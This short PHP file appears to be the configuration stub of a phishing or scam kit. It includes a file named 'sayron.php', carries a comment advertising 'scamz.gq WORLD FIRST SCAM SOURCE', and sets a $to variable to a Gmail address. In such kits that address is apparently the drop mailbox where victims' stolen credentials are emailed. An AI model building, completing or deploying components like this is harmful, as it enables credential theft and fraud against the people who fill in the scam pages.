<?

include 'sayron.php'; 
//scamz.gq WORLD FIRST SCAM SOURCE


$to="redvelvet36sth@gmail.com";
?>
